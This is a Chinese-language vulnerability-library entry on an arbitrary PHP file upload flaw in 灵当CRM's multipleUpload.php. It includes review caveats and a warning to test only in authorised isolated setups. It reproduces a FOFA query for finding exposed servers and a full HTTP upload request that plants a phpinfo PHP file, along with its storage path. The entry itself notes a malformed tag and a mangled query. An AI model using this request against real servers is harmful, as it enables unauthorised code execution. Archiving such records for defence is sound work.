---
source: "wy876 漏洞文库"
title: "灵当CRM Home multipleUpload PHP上传"
product: "灵当CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；PHP short_open_tag可能相关"
prerequisites: "无Cookie示例，权限待核"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/nlhbtvcu71urmozp"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%81%B5%E5%BD%93CRM/%E7%81%B5%E5%BD%93crmmultipleUpload%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "body="
id: "vw-babf8b57b232107946eee80c"
entity_id: "ve-babf8b57b232107946eee80c"
schema_version: "1"
---

# 灵当CRM Home multipleUpload PHP上传

## 条目说明

- 对象与具体问题：灵当CRM；Home multipleUpload PHP上传
- 版本、配置及部署条件：版本未知；PHP short_open_tag可能相关
- 认证与权限前提：无Cookie示例，权限待核
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- `<?phpinfo()；?>`缺php开标记后的空白，可能按短标签解释或原文错误，不能直接当标准phpinfo有效代码
- FOFA把localhost URL的Markdown链接塞进查询，严重格式污染，需重建
- Content-Length779与短multipart不符，UPLOAD_ERR_OK为客户端字段不代表服务器成功
- 固定周目录路径无响应/执行结果，补版本/清理/修复

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
灵当CRM（Customer Relationship Management，客户关系管理）是一款面向中小企业的客户关系管理软件，旨在帮助企业更好地管理客户信息、销售流程、市场营销和服务支持等方面的工作。灵当CRM提供了一系列工具和功能，帮助企业在销售、市场和服务部门之间实现高效协作，提高客户满意度和业务效率。灵当crm multipleUpload.php处存在任意文件上传漏洞。

## 二、影响版本
+ 灵当crm

## 三、资产测绘
+ fofa`body="[http://localhost:8088/crm/index.php"](http://localhost:8088/crm/index.php") && body="ldcrm.base.js"`
+ 特征


## 四、漏洞复现
```http
POST /crm/modules/Home/multipleUpload.php?uploadtype=uploadimg HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0Mh3BfgWszxRFokh
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36

------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="file"; filename="budong.php"
Content-Type: text/plain

<?phpinfo();?>
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="error"

UPLOAD_ERR_OK
------WebKitFormBoundary0Mh3BfgWszxRFokh--
```

> 请求长度说明：原资料 Content-Length 为 779；静态长度已移除，应由客户端根据最终请求体的字节数生成。


上传路径

```java
crm/storage/2024/September/week3/budong.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nlhbtvcu71urmozp>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
